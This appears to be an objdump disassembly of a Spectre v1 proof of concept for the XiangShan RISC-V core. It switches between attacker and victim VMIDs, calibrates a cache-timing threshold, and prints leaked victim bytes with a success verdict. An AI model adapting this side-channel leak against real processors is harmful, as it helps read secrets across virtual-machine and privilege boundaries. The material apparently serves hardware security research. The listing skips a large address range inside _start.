
/nfs/home/leizhenyu/opt/verified_poc/xiangshan-v2/spectre-v1-vmid-kmhv2/code/build/spectre-v1-vmid-priv-riscv64-xs.elf:     file format elf64-littleriscv


Disassembly of section .text:

0000000080000000 <_start>:
    80000000:	00000093          	li	ra,0
    80000ebc:	0002b303          	ld	t1,0(t0)
    80000ec0:	68031073          	csrw	hgatp,t1
    80000ec4:	0000100f          	fence.i
    80000ec8:	68002373          	csrr	t1,hgatp
    80000ecc:	00023297          	auipc	t0,0x23
    80000ed0:	1a428293          	addi	t0,t0,420 # 80024070 <observed_attacker_hgatp>
    80000ed4:	0062b023          	sd	t1,0(t0)
    80000ed8:	00023297          	auipc	t0,0x23
    80000edc:	1a828293          	addi	t0,t0,424 # 80024080 <attacker_vsatp_for_trap>
    80000ee0:	0002b303          	ld	t1,0(t0)
    80000ee4:	28031073          	csrw	vsatp,t1
    80000ee8:	0000100f          	fence.i
    80000eec:	28002373          	csrr	t1,vsatp
    80000ef0:	00023297          	auipc	t0,0x23
    80000ef4:	17028293          	addi	t0,t0,368 # 80024060 <observed_attacker_vsatp>
    80000ef8:	0062b023          	sd	t1,0(t0)
    80000efc:	00023297          	auipc	t0,0x23
    80000f00:	1ac28293          	addi	t0,t0,428 # 800240a8 <resume_attacker_epc>
    80000f04:	0002b303          	ld	t1,0(t0)
    80000f08:	34131073          	csrw	mepc,t1
    80000f0c:	040002b7          	lui	t0,0x4000
    80000f10:	22c5                	addiw	t0,t0,17 # 4000011 <i+0x3fffff1>
    80000f12:	02b6                	slli	t0,t0,0xd
    80000f14:	80028293          	addi	t0,t0,-2048
    80000f18:	3002b073          	csrc	mstatus,t0
    80000f1c:	0010029b          	addiw	t0,zero,1
    80000f20:	129e                	slli	t0,t0,0x27
    80000f22:	3002a073          	csrs	mstatus,t0
    80000f26:	00023297          	auipc	t0,0x23
    80000f2a:	17228293          	addi	t0,t0,370 # 80024098 <saved_attacker_trap_sp>
    80000f2e:	0002b103          	ld	sp,0(t0)
    80000f32:	6082                	ld	ra,0(sp)
    80000f34:	62a2                	ld	t0,8(sp)
    80000f36:	6342                	ld	t1,16(sp)
    80000f38:	63e2                	ld	t2,24(sp)
    80000f3a:	7502                	ld	a0,32(sp)
    80000f3c:	75a2                	ld	a1,40(sp)
    80000f3e:	7642                	ld	a2,48(sp)
    80000f40:	76e2                	ld	a3,56(sp)
    80000f42:	6706                	ld	a4,64(sp)
    80000f44:	67a6                	ld	a5,72(sp)
    80000f46:	6846                	ld	a6,80(sp)
    80000f48:	68e6                	ld	a7,88(sp)
    80000f4a:	610d                	addi	sp,sp,160
    80000f4c:	34011173          	csrrw	sp,mscratch,sp
    80000f50:	30200073          	mret
    80000f54:	00000297          	auipc	t0,0x0
    80000f58:	13c28293          	addi	t0,t0,316 # 80001090 <machine_low_return>
    80000f5c:	34129073          	csrw	mepc,t0
    80000f60:	040002b7          	lui	t0,0x4000
    80000f64:	22c5                	addiw	t0,t0,17 # 4000011 <i+0x3fffff1>
    80000f66:	02b6                	slli	t0,t0,0xd
    80000f68:	80028293          	addi	t0,t0,-2048
    80000f6c:	3002b073          	csrc	mstatus,t0
    80000f70:	6289                	lui	t0,0x2
    80000f72:	8002829b          	addiw	t0,t0,-2048 # 1800 <i+0x17e0>
    80000f76:	3002a073          	csrs	mstatus,t0
    80000f7a:	6082                	ld	ra,0(sp)
    80000f7c:	62a2                	ld	t0,8(sp)
    80000f7e:	6342                	ld	t1,16(sp)
    80000f80:	63e2                	ld	t2,24(sp)
    80000f82:	7502                	ld	a0,32(sp)
    80000f84:	75a2                	ld	a1,40(sp)
    80000f86:	7642                	ld	a2,48(sp)
    80000f88:	76e2                	ld	a3,56(sp)
    80000f8a:	6706                	ld	a4,64(sp)
    80000f8c:	67a6                	ld	a5,72(sp)
    80000f8e:	6846                	ld	a6,80(sp)
    80000f90:	68e6                	ld	a7,88(sp)
    80000f92:	610d                	addi	sp,sp,160
    80000f94:	00000297          	auipc	t0,0x0
    80000f98:	0fc28293          	addi	t0,t0,252 # 80001090 <machine_low_return>
    80000f9c:	8282                	jr	t0

0000000080000f9e <enter_attacker_process>:
    80000f9e:	7179                	addi	sp,sp,-48
    80000fa0:	f406                	sd	ra,40(sp)
    80000fa2:	f022                	sd	s0,32(sp)
    80000fa4:	1800                	addi	s0,sp,48
    80000fa6:	00006717          	auipc	a4,0x6
    80000faa:	05a70713          	addi	a4,a4,90 # 80007000 <attacker_stack>
    80000fae:	6791                	lui	a5,0x4
    80000fb0:	17c1                	addi	a5,a5,-16 # 3ff0 <i+0x3fd0>
    80000fb2:	97ba                	add	a5,a5,a4
    80000fb4:	fef43423          	sd	a5,-24(s0)
    80000fb8:	0001f717          	auipc	a4,0x1f
    80000fbc:	0a870713          	addi	a4,a4,168 # 80020060 <m_stack>
    80000fc0:	6791                	lui	a5,0x4
    80000fc2:	17c1                	addi	a5,a5,-16 # 3ff0 <i+0x3fd0>
    80000fc4:	97ba                	add	a5,a5,a4
    80000fc6:	fef43023          	sd	a5,-32(s0)
    80000fca:	7cb020ef          	jal	80003f94 <init_pmp>
    80000fce:	00000797          	auipc	a5,0x0
    80000fd2:	e4a78793          	addi	a5,a5,-438 # 80000e18 <m_trap_entry>
    80000fd6:	30579073          	csrw	mtvec,a5
    80000fda:	30201073          	csrw	medeleg,zero
    80000fde:	30301073          	csrw	mideleg,zero
    80000fe2:	52fd                	li	t0,-1
    80000fe4:	30629073          	csrw	mcounteren,t0
    80000fe8:	60629073          	csrw	hcounteren,t0
    80000fec:	10629073          	csrw	scounteren,t0
    80000ff0:	829ff0ef          	jal	80000818 <install_vmid_page_tables>
    80000ff4:	00024717          	auipc	a4,0x24
    80000ff8:	00c70713          	addi	a4,a4,12 # 80025000 <attacker_space>
    80000ffc:	000517b7          	lui	a5,0x51
    80001000:	97ba                	add	a5,a5,a4
    80001002:	779c                	ld	a5,40(a5)
    80001004:	4585                	li	a1,1
    80001006:	853e                	mv	a0,a5
    80001008:	fd0ff0ef          	jal	800007d8 <switch_hgatp>
    8000100c:	872a                	mv	a4,a0
    8000100e:	00023797          	auipc	a5,0x23
    80001012:	06278793          	addi	a5,a5,98 # 80024070 <observed_attacker_hgatp>
    80001016:	e398                	sd	a4,0(a5)
    80001018:	00024717          	auipc	a4,0x24
    8000101c:	fe870713          	addi	a4,a4,-24 # 80025000 <attacker_space>
    80001020:	000517b7          	lui	a5,0x51
    80001024:	97ba                	add	a5,a5,a4
    80001026:	739c                	ld	a5,32(a5)
    80001028:	4585                	li	a1,1
    8000102a:	853e                	mv	a0,a5
    8000102c:	f70ff0ef          	jal	8000079c <switch_vsatp>
    80001030:	872a                	mv	a4,a0
    80001032:	00023797          	auipc	a5,0x23
    80001036:	02e78793          	addi	a5,a5,46 # 80024060 <observed_attacker_vsatp>
    8000103a:	e398                	sd	a4,0(a5)
    8000103c:	870a                	mv	a4,sp
    8000103e:	0001f797          	auipc	a5,0x1f
    80001042:	01278793          	addi	a5,a5,18 # 80020050 <saved_main_m_sp>
    80001046:	e398                	sd	a4,0(a5)
    80001048:	300027f3          	csrr	a5,mstatus
    8000104c:	fcf43c23          	sd	a5,-40(s0)
    80001050:	fd843703          	ld	a4,-40(s0)
    80001054:	00005797          	auipc	a5,0x5
    80001058:	68c78793          	addi	a5,a5,1676 # 800066e0 <printf_+0x982>
    8000105c:	639c                	ld	a5,0(a5)
    8000105e:	8f7d                	and	a4,a4,a5
    80001060:	2a701793          	bseti	a5,zero,0x27
    80001064:	8fd9                	or	a5,a5,a4
    80001066:	fcf43c23          	sd	a5,-40(s0)
    8000106a:	00001617          	auipc	a2,0x1
    8000106e:	66660613          	addi	a2,a2,1638 # 800026d0 <attacker_entry>
    80001072:	fe043783          	ld	a5,-32(s0)
    80001076:	fe843703          	ld	a4,-24(s0)
    8000107a:	fd843683          	ld	a3,-40(s0)
    8000107e:	34079073          	csrw	mscratch,a5
    80001082:	813a                	mv	sp,a4
    80001084:	30069073          	csrw	mstatus,a3
    80001088:	34161073          	csrw	mepc,a2
    8000108c:	30200073          	mret

0000000080001090 <machine_low_return>:
    80001090:	0001f297          	auipc	t0,0x1f
    80001094:	fc028293          	addi	t0,t0,-64 # 80020050 <saved_main_m_sp>
    80001098:	0002b103          	ld	sp,0(t0)
    8000109c:	0001                	nop
    8000109e:	70a2                	ld	ra,40(sp)
    800010a0:	7402                	ld	s0,32(sp)
    800010a2:	6145                	addi	sp,sp,48
    800010a4:	8082                	ret

00000000800010a6 <main>:
    800010a6:	711d                	addi	sp,sp,-96
    800010a8:	ec86                	sd	ra,88(sp)
    800010aa:	e8a2                	sd	s0,80(sp)
    800010ac:	1080                	addi	s0,sp,96
    800010ae:	fe043423          	sd	zero,-24(s0)
    800010b2:	a00d                	j	800010d4 <main+0x2e>
    800010b4:	fe843783          	ld	a5,-24(s0)
    800010b8:	079a                	slli	a5,a5,0x6
    800010ba:	00012717          	auipc	a4,0x12
    800010be:	f4670713          	addi	a4,a4,-186 # 80013000 <shared_probe>
    800010c2:	97ba                	add	a5,a5,a4
    800010c4:	4705                	li	a4,1
    800010c6:	00e78023          	sb	a4,0(a5)
    800010ca:	fe843783          	ld	a5,-24(s0)
    800010ce:	0785                	addi	a5,a5,1
    800010d0:	fef43423          	sd	a5,-24(s0)
    800010d4:	fe843703          	ld	a4,-24(s0)
    800010d8:	0ff00793          	li	a5,255
    800010dc:	fce7fce3          	bgeu	a5,a4,800010b4 <main+0xe>
    800010e0:	04000593          	li	a1,64
    800010e4:	00012517          	auipc	a0,0x12
    800010e8:	f1c50513          	addi	a0,a0,-228 # 80013000 <shared_probe>
    800010ec:	912ff0ef          	jal	800001fe <xs_calibrate_threshold>
    800010f0:	fca43823          	sd	a0,-48(s0)
    800010f4:	0000d797          	auipc	a5,0xd
    800010f8:	f0c78793          	addi	a5,a5,-244 # 8000e000 <active_threshold>
    800010fc:	fd043703          	ld	a4,-48(s0)
    80001100:	e398                	sd	a4,0(a5)
    80001102:	0000d797          	auipc	a5,0xd
    80001106:	efe78793          	addi	a5,a5,-258 # 8000e000 <active_threshold>
    8000110a:	03200713          	li	a4,50
    8000110e:	e398                	sd	a4,0(a5)
    80001110:	e802                	sd	zero,16(sp)
    80001112:	10000793          	li	a5,256
    80001116:	e43e                	sd	a5,8(sp)
    80001118:	03e00793          	li	a5,62
    8000111c:	e03e                	sd	a5,0(sp)
    8000111e:	4899                	li	a7,6
    80001120:	4805                	li	a6,1
    80001122:	4781                	li	a5,0
    80001124:	475d                	li	a4,23
    80001126:	46c5                	li	a3,17
    80001128:	465d                	li	a2,23
    8000112a:	45c5                	li	a1,17
    8000112c:	00005517          	auipc	a0,0x5
    80001130:	02c50513          	addi	a0,a0,44 # 80006158 <printf_+0x3fa>
    80001134:	42b040ef          	jal	80005d5e <printf_>
    80001138:	4581                	li	a1,0
    8000113a:	00005517          	auipc	a0,0x5
    8000113e:	14650513          	addi	a0,a0,326 # 80006280 <printf_+0x522>
    80001142:	41d040ef          	jal	80005d5e <printf_>
    80001146:	0000d797          	auipc	a5,0xd
    8000114a:	eba78793          	addi	a5,a5,-326 # 8000e000 <active_threshold>
    8000114e:	639c                	ld	a5,0(a5)
    80001150:	4705                	li	a4,1
    80001152:	86be                	mv	a3,a5
    80001154:	fd043603          	ld	a2,-48(s0)
    80001158:	03200593          	li	a1,50
    8000115c:	00005517          	auipc	a0,0x5
    80001160:	14c50513          	addi	a0,a0,332 # 800062a8 <printf_+0x54a>
    80001164:	3fb040ef          	jal	80005d5e <printf_>
    80001168:	00005517          	auipc	a0,0x5
    8000116c:	19050513          	addi	a0,a0,400 # 800062f8 <printf_+0x59a>
    80001170:	3ef040ef          	jal	80005d5e <printf_>
    80001174:	00012717          	auipc	a4,0x12
    80001178:	e8c70713          	addi	a4,a4,-372 # 80013000 <shared_probe>
    8000117c:	05000693          	li	a3,80
    80001180:	00017617          	auipc	a2,0x17
    80001184:	ed060613          	addi	a2,a2,-304 # 80018050 <victim_region+0x50>
    80001188:	00017597          	auipc	a1,0x17
    8000118c:	e7858593          	addi	a1,a1,-392 # 80018000 <victim_region>
    80001190:	00005517          	auipc	a0,0x5
    80001194:	1f850513          	addi	a0,a0,504 # 80006388 <printf_+0x62a>
    80001198:	3c7040ef          	jal	80005d5e <printf_>
    8000119c:	e03ff0ef          	jal	80000f9e <enter_attacker_process>
    800011a0:	0000f797          	auipc	a5,0xf
    800011a4:	e6078793          	addi	a5,a5,-416 # 80010000 <direct_victim_fault_seen>
    800011a8:	638c                	ld	a1,0(a5)
    800011aa:	00010797          	auipc	a5,0x10
    800011ae:	e5678793          	addi	a5,a5,-426 # 80011000 <direct_victim_read_completed>
    800011b2:	6390                	ld	a2,0(a5)
    800011b4:	00011797          	auipc	a5,0x11
    800011b8:	e4c78793          	addi	a5,a5,-436 # 80012000 <direct_victim_read_value>
    800011bc:	639c                	ld	a5,0(a5)
    800011be:	0ff7f693          	zext.b	a3,a5
    800011c2:	0001f797          	auipc	a5,0x1f
    800011c6:	e3e78793          	addi	a5,a5,-450 # 80020000 <trap_count>
    800011ca:	ec3e                	sd	a5,24(sp)
    800011cc:	00017797          	auipc	a5,0x17
    800011d0:	e3478793          	addi	a5,a5,-460 # 80018000 <victim_region>
    800011d4:	e83e                	sd	a5,16(sp)
    800011d6:	00017797          	auipc	a5,0x17
    800011da:	e2a78793          	addi	a5,a5,-470 # 80018000 <victim_region>
    800011de:	e43e                	sd	a5,8(sp)
    800011e0:	00012797          	auipc	a5,0x12
    800011e4:	e2078793          	addi	a5,a5,-480 # 80013000 <shared_probe>
    800011e8:	e03e                	sd	a5,0(sp)
    800011ea:	00012897          	auipc	a7,0x12
    800011ee:	e1688893          	addi	a7,a7,-490 # 80013000 <shared_probe>
    800011f2:	00006817          	auipc	a6,0x6
    800011f6:	e0e80813          	addi	a6,a6,-498 # 80007000 <attacker_stack>
    800011fa:	00002797          	auipc	a5,0x2
    800011fe:	e0678793          	addi	a5,a5,-506 # 80003000 <__u_text_end>
    80001202:	00001717          	auipc	a4,0x1
    80001206:	dfe70713          	addi	a4,a4,-514 # 80002000 <candidate_value>
    8000120a:	00005517          	auipc	a0,0x5
    8000120e:	1ce50513          	addi	a0,a0,462 # 800063d8 <printf_+0x67a>
    80001212:	34d040ef          	jal	80005d5e <printf_>
    80001216:	00024717          	auipc	a4,0x24
    8000121a:	dea70713          	addi	a4,a4,-534 # 80025000 <attacker_space>
    8000121e:	000517b7          	lui	a5,0x51
    80001222:	97ba                	add	a5,a5,a4
    80001224:	738c                	ld	a1,32(a5)
    80001226:	00076717          	auipc	a4,0x76
    8000122a:	dda70713          	addi	a4,a4,-550 # 80077000 <victim_space>
    8000122e:	000517b7          	lui	a5,0x51
    80001232:	97ba                	add	a5,a5,a4
    80001234:	7390                	ld	a2,32(a5)
    80001236:	00023797          	auipc	a5,0x23
    8000123a:	e2a78793          	addi	a5,a5,-470 # 80024060 <observed_attacker_vsatp>
    8000123e:	6394                	ld	a3,0(a5)
    80001240:	00023797          	auipc	a5,0x23
    80001244:	e2878793          	addi	a5,a5,-472 # 80024068 <observed_victim_vsatp>
    80001248:	639c                	ld	a5,0(a5)
    8000124a:	873e                	mv	a4,a5
    8000124c:	00005517          	auipc	a0,0x5
    80001250:	22450513          	addi	a0,a0,548 # 80006470 <printf_+0x712>
    80001254:	30b040ef          	jal	80005d5e <printf_>
    80001258:	00024717          	auipc	a4,0x24
    8000125c:	da870713          	addi	a4,a4,-600 # 80025000 <attacker_space>
    80001260:	000517b7          	lui	a5,0x51
    80001264:	97ba                	add	a5,a5,a4
    80001266:	778c                	ld	a1,40(a5)
    80001268:	00076717          	auipc	a4,0x76
    8000126c:	d9870713          	addi	a4,a4,-616 # 80077000 <victim_space>
    80001270:	000517b7          	lui	a5,0x51
    80001274:	97ba                	add	a5,a5,a4
    80001276:	7790                	ld	a2,40(a5)
    80001278:	00023797          	auipc	a5,0x23
    8000127c:	df878793          	addi	a5,a5,-520 # 80024070 <observed_attacker_hgatp>
    80001280:	6394                	ld	a3,0(a5)
    80001282:	00023797          	auipc	a5,0x23
    80001286:	df678793          	addi	a5,a5,-522 # 80024078 <observed_victim_hgatp>
    8000128a:	6398                	ld	a4,0(a5)
    8000128c:	03fff7b7          	lui	a5,0x3fff
    80001290:	1782                	slli	a5,a5,0x20
    80001292:	00005517          	auipc	a0,0x5
    80001296:	25650513          	addi	a0,a0,598 # 800064e8 <printf_+0x78a>
    8000129a:	2c5040ef          	jal	80005d5e <printf_>
    8000129e:	0001f797          	auipc	a5,0x1f
    800012a2:	d6278793          	addi	a5,a5,-670 # 80020000 <trap_count>
    800012a6:	638c                	ld	a1,0(a5)
    800012a8:	0001f797          	auipc	a5,0x1f
    800012ac:	d6078793          	addi	a5,a5,-672 # 80020008 <victim_call_count>
    800012b0:	6390                	ld	a2,0(a5)
    800012b2:	0001f797          	auipc	a5,0x1f
    800012b6:	d5e78793          	addi	a5,a5,-674 # 80020010 <victim_done_count>
    800012ba:	6394                	ld	a3,0(a5)
    800012bc:	0001f797          	auipc	a5,0x1f
    800012c0:	d5c78793          	addi	a5,a5,-676 # 80020018 <flush_call_count>
    800012c4:	6398                	ld	a4,0(a5)
    800012c6:	0001f797          	auipc	a5,0x1f
    800012ca:	d5a78793          	addi	a5,a5,-678 # 80020020 <exit_call_count>
    800012ce:	6388                	ld	a0,0(a5)
    800012d0:	0001f797          	auipc	a5,0x1f
    800012d4:	d5878793          	addi	a5,a5,-680 # 80020028 <bad_trap_count>
    800012d8:	0007b803          	ld	a6,0(a5)
    800012dc:	0001f797          	auipc	a5,0x1f
    800012e0:	d5478793          	addi	a5,a5,-684 # 80020030 <last_mcause>
    800012e4:	0007b883          	ld	a7,0(a5)
    800012e8:	0001f797          	auipc	a5,0x1f
    800012ec:	d5078793          	addi	a5,a5,-688 # 80020038 <last_mepc>
    800012f0:	639c                	ld	a5,0(a5)
    800012f2:	833e                	mv	t1,a5
    800012f4:	0001f797          	auipc	a5,0x1f
    800012f8:	d5078793          	addi	a5,a5,-688 # 80020044 <attack_status>
    800012fc:	439c                	lw	a5,0(a5)
    800012fe:	2781                	sext.w	a5,a5
    80001300:	e43e                	sd	a5,8(sp)
    80001302:	e01a                	sd	t1,0(sp)
    80001304:	87aa                	mv	a5,a0
    80001306:	00005517          	auipc	a0,0x5
    8000130a:	26a50513          	addi	a0,a0,618 # 80006570 <printf_+0x812>
    8000130e:	251040ef          	jal	80005d5e <printf_>
    80001312:	4785                	li	a5,1
    80001314:	fef42223          	sw	a5,-28(s0)
    80001318:	fc043c23          	sd	zero,-40(s0)
    8000131c:	a2b9                	j	8000146a <main+0x3c4>
    8000131e:	0000a717          	auipc	a4,0xa
    80001322:	ce270713          	addi	a4,a4,-798 # 8000b000 <leaked_idx>
    80001326:	fd843783          	ld	a5,-40(s0)
    8000132a:	0786                	slli	a5,a5,0x1
    8000132c:	97ba                	add	a5,a5,a4
    8000132e:	0007c783          	lbu	a5,0(a5)
    80001332:	fcf403a3          	sb	a5,-57(s0)
    80001336:	0000a717          	auipc	a4,0xa
    8000133a:	cca70713          	addi	a4,a4,-822 # 8000b000 <leaked_idx>
    8000133e:	fd843783          	ld	a5,-40(s0)
    80001342:	0786                	slli	a5,a5,0x1
    80001344:	97ba                	add	a5,a5,a4
    80001346:	0017c783          	lbu	a5,1(a5)
    8000134a:	fcf40323          	sb	a5,-58(s0)
    8000134e:	00017717          	auipc	a4,0x17
    80001352:	cb270713          	addi	a4,a4,-846 # 80018000 <victim_region>
    80001356:	fd843783          	ld	a5,-40(s0)
    8000135a:	97ba                	add	a5,a5,a4
    8000135c:	0507c783          	lbu	a5,80(a5)
    80001360:	fcf402a3          	sb	a5,-59(s0)
    80001364:	fc544783          	lbu	a5,-59(s0)
    80001368:	0007851b          	sext.w	a0,a5
    8000136c:	fc544783          	lbu	a5,-59(s0)
    80001370:	0007831b          	sext.w	t1,a5
    80001374:	fc744783          	lbu	a5,-57(s0)
    80001378:	0ff7f713          	zext.b	a4,a5
    8000137c:	47fd                	li	a5,31
    8000137e:	00e7ff63          	bgeu	a5,a4,8000139c <main+0x2f6>
    80001382:	fc744783          	lbu	a5,-57(s0)
    80001386:	0ff7f713          	zext.b	a4,a5
    8000138a:	07e00793          	li	a5,126
    8000138e:	00e7e763          	bltu	a5,a4,8000139c <main+0x2f6>
    80001392:	fc744783          	lbu	a5,-57(s0)
    80001396:	0007871b          	sext.w	a4,a5
    8000139a:	a019                	j	800013a0 <main+0x2fa>
    8000139c:	03f00713          	li	a4,63
    800013a0:	fc744783          	lbu	a5,-57(s0)
    800013a4:	00078e1b          	sext.w	t3,a5
    800013a8:	0000b697          	auipc	a3,0xb
    800013ac:	c5868693          	addi	a3,a3,-936 # 8000c000 <leaked_score>
    800013b0:	fd843783          	ld	a5,-40(s0)
    800013b4:	0792                	slli	a5,a5,0x4
    800013b6:	97b6                	add	a5,a5,a3
    800013b8:	0007b803          	ld	a6,0(a5)
    800013bc:	fc644783          	lbu	a5,-58(s0)
    800013c0:	0ff7f693          	zext.b	a3,a5
    800013c4:	47fd                	li	a5,31
    800013c6:	00d7ff63          	bgeu	a5,a3,800013e4 <main+0x33e>
    800013ca:	fc644783          	lbu	a5,-58(s0)
    800013ce:	0ff7f693          	zext.b	a3,a5
    800013d2:	07e00793          	li	a5,126
    800013d6:	00d7e763          	bltu	a5,a3,800013e4 <main+0x33e>
    800013da:	fc644783          	lbu	a5,-58(s0)
    800013de:	0007869b          	sext.w	a3,a5
    800013e2:	a019                	j	800013e8 <main+0x342>
    800013e4:	03f00693          	li	a3,63
    800013e8:	fc644783          	lbu	a5,-58(s0)
    800013ec:	0007861b          	sext.w	a2,a5
    800013f0:	0000b597          	auipc	a1,0xb
    800013f4:	c1058593          	addi	a1,a1,-1008 # 8000c000 <leaked_score>
    800013f8:	fd843783          	ld	a5,-40(s0)
    800013fc:	0792                	slli	a5,a5,0x4
    800013fe:	97ae                	add	a5,a5,a1
    80001400:	679c                	ld	a5,8(a5)
    80001402:	e43e                	sd	a5,8(sp)
    80001404:	e032                	sd	a2,0(sp)
    80001406:	88b6                	mv	a7,a3
    80001408:	87f2                	mv	a5,t3
    8000140a:	869a                	mv	a3,t1
    8000140c:	862a                	mv	a2,a0
    8000140e:	fd843583          	ld	a1,-40(s0)
    80001412:	00005517          	auipc	a0,0x5
    80001416:	1ee50513          	addi	a0,a0,494 # 80006600 <printf_+0x8a2>
    8000141a:	145040ef          	jal	80005d5e <printf_>
    8000141e:	0000c717          	auipc	a4,0xc
    80001422:	be270713          	addi	a4,a4,-1054 # 8000d000 <rounds_used>
    80001426:	fd843783          	ld	a5,-40(s0)
    8000142a:	078e                	slli	a5,a5,0x3
    8000142c:	97ba                	add	a5,a5,a4
    8000142e:	6390                	ld	a2,0(a5)
    80001430:	4789                	li	a5,2
    80001432:	470d                	li	a4,3
    80001434:	4685                	li	a3,1
    80001436:	fd843583          	ld	a1,-40(s0)
    8000143a:	00005517          	auipc	a0,0x5
    8000143e:	22e50513          	addi	a0,a0,558 # 80006668 <printf_+0x90a>
    80001442:	11d040ef          	jal	80005d5e <printf_>
    80001446:	fc744783          	lbu	a5,-57(s0)
    8000144a:	873e                	mv	a4,a5
    8000144c:	fc544783          	lbu	a5,-59(s0)
    80001450:	0ff77713          	zext.b	a4,a4
    80001454:	0ff7f793          	zext.b	a5,a5
    80001458:	00f70463          	beq	a4,a5,80001460 <main+0x3ba>
    8000145c:	fe042223          	sw	zero,-28(s0)
    80001460:	fd843783          	ld	a5,-40(s0)
    80001464:	0785                	addi	a5,a5,1
    80001466:	fcf43c23          	sd	a5,-40(s0)
    8000146a:	fd843703          	ld	a4,-40(s0)
    8000146e:	4795                	li	a5,5
    80001470:	eae7f7e3          	bgeu	a5,a4,8000131e <main+0x278>
    80001474:	0000f797          	auipc	a5,0xf
    80001478:	b8c78793          	addi	a5,a5,-1140 # 80010000 <direct_victim_fault_seen>
    8000147c:	639c                	ld	a5,0(a5)
    8000147e:	cb8d                	beqz	a5,800014b0 <main+0x40a>
    80001480:	00010797          	auipc	a5,0x10
    80001484:	b8078793          	addi	a5,a5,-1152 # 80011000 <direct_victim_read_completed>
    80001488:	639c                	ld	a5,0(a5)
    8000148a:	e39d                	bnez	a5,800014b0 <main+0x40a>
    8000148c:	00023797          	auipc	a5,0x23
    80001490:	be478793          	addi	a5,a5,-1052 # 80024070 <observed_attacker_hgatp>
    80001494:	6398                	ld	a4,0(a5)
    80001496:	00023797          	auipc	a5,0x23
    8000149a:	be278793          	addi	a5,a5,-1054 # 80024078 <observed_victim_hgatp>
    8000149e:	639c                	ld	a5,0(a5)
    800014a0:	8f3d                	xor	a4,a4,a5
    800014a2:	03fff7b7          	lui	a5,0x3fff
    800014a6:	1782                	slli	a5,a5,0x20
    800014a8:	8ff9                	and	a5,a5,a4
    800014aa:	c399                	beqz	a5,800014b0 <main+0x40a>
    800014ac:	4785                	li	a5,1
    800014ae:	a011                	j	800014b2 <main+0x40c>
    800014b0:	4781                	li	a5,0
    800014b2:	fcf42623          	sw	a5,-52(s0)
    800014b6:	0001f797          	auipc	a5,0x1f
    800014ba:	b8e78793          	addi	a5,a5,-1138 # 80020044 <attack_status>
    800014be:	439c                	lw	a5,0(a5)
    800014c0:	2781                	sext.w	a5,a5
    800014c2:	e3b9                	bnez	a5,80001508 <main+0x462>
    800014c4:	0001f797          	auipc	a5,0x1f
    800014c8:	b6478793          	addi	a5,a5,-1180 # 80020028 <bad_trap_count>
    800014cc:	639c                	ld	a5,0(a5)
    800014ce:	ef8d                	bnez	a5,80001508 <main+0x462>
    800014d0:	0001f797          	auipc	a5,0x1f
    800014d4:	b3878793          	addi	a5,a5,-1224 # 80020008 <victim_call_count>
    800014d8:	639c                	ld	a5,0(a5)
    800014da:	c79d                	beqz	a5,80001508 <main+0x462>
    800014dc:	0001f797          	auipc	a5,0x1f
    800014e0:	b3478793          	addi	a5,a5,-1228 # 80020010 <victim_done_count>
    800014e4:	6398                	ld	a4,0(a5)
    800014e6:	0001f797          	auipc	a5,0x1f
    800014ea:	b2278793          	addi	a5,a5,-1246 # 80020008 <victim_call_count>
    800014ee:	639c                	ld	a5,0(a5)
    800014f0:	00f71c63          	bne	a4,a5,80001508 <main+0x462>
    800014f4:	fcc42783          	lw	a5,-52(s0)
    800014f8:	2781                	sext.w	a5,a5
    800014fa:	c799                	beqz	a5,80001508 <main+0x462>
    800014fc:	fe442783          	lw	a5,-28(s0)
    80001500:	2781                	sext.w	a5,a5
    80001502:	c399                	beqz	a5,80001508 <main+0x462>
    80001504:	4785                	li	a5,1
    80001506:	a011                	j	8000150a <main+0x464>
    80001508:	4781                	li	a5,0
    8000150a:	fcf42423          	sw	a5,-56(s0)
    8000150e:	fc842783          	lw	a5,-56(s0)
    80001512:	2781                	sext.w	a5,a5
    80001514:	c791                	beqz	a5,80001520 <main+0x47a>
    80001516:	00005797          	auipc	a5,0x5
    8000151a:	19a78793          	addi	a5,a5,410 # 800066b0 <printf_+0x952>
    8000151e:	a029                	j	80001528 <main+0x482>
    80001520:	00005797          	auipc	a5,0x5
    80001524:	19878793          	addi	a5,a5,408 # 800066b8 <printf_+0x95a>
    80001528:	85be                	mv	a1,a5
    8000152a:	00005517          	auipc	a0,0x5
    8000152e:	19650513          	addi	a0,a0,406 # 800066c0 <printf_+0x962>
    80001532:	02d040ef          	jal	80005d5e <printf_>
    80001536:	fc842783          	lw	a5,-56(s0)
    8000153a:	2781                	sext.w	a5,a5
    8000153c:	0017b793          	seqz	a5,a5
    80001540:	0ff7f793          	zext.b	a5,a5
    80001544:	2781                	sext.w	a5,a5
    80001546:	853e                	mv	a0,a5
    80001548:	60e6                	ld	ra,88(sp)
